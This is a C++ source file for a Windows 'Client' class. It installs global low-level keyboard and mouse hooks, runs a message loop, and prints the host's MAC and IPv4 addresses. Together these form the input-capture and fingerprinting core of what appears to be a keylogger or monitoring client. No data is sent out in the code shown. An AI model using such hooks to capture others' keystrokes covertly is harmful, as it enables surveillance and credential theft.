#include "Client.h"

Client::Client()
{
}

Client::~Client()
{
}

void		Client::setKeyboardHook(void)
{
	m_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
}

void		Client::setMouseHook(void)
{
	m_mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0);
}

void		Client::unsetHook(HHOOK hook)
{
	UnhookWindowsHookEx(hook);
}

void		Client::unsetKeyboardHook(void)
{
	unsetHook(m_keyboardHook);
}

void		Client::unsetMouseHook(void)
{
	unsetHook(m_mouseHook);
}

void		Client::sendBackMessage(void)
{
	MSG		message;
	
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

void		printMAC(unsigned char MAC[])
{
	printf("%02X-%02X-%02X-%02X-%02X-%02X", MAC[0], MAC[1], MAC[2], MAC[3], MAC[4], MAC[5]);
}

void		printIPAddrList(IP_ADDR_STRING IPv4)
{
	printf("  IPv4 (%s)", IPv4.IpAddress.String);
}

void		Client::getMACAddress(void)
{
	IP_ADAPTER_INFO AdapterInfo[16];
	DWORD dwBufLen = sizeof(AdapterInfo);
	DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
	if (dwStatus == ERROR_SUCCESS)
	{
		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;

		std::cout << "\t===== MAC Address =====" << std::endl;
		while (pAdapterInfo)
		{
			printMAC(pAdapterInfo->Address);
			printf("  Enabled (%u)", pAdapterInfo->DhcpEnabled);
			printIPAddrList(pAdapterInfo->IpAddressList);
			printf("\n");
			pAdapterInfo = pAdapterInfo->Next;
		}
		std::cout << "\t===== MAC Address =====" << std::endl;
	}
}